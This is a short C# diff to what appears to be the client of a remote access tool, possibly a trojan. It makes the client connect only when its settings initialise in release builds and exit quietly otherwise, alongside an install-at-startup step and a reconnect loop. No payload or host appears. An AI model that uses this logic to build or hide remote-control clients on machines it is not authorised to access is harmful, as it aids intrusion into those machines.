@@ -30,8 +30,14 @@ namespace Client
             if (Convert.ToBoolean(Settings.Install))
                 NormalStartup.Install();
 
+#if DEBUG
             ClientSocket.InitializeClient();
-
+#else
+            if (Settings.InitializeSettings())
+                ClientSocket.InitializeClient();
+            else
+                Environment.Exit(0);
+#endif
             while (true)
             {
                 if (!ClientSocket.IsConnected)
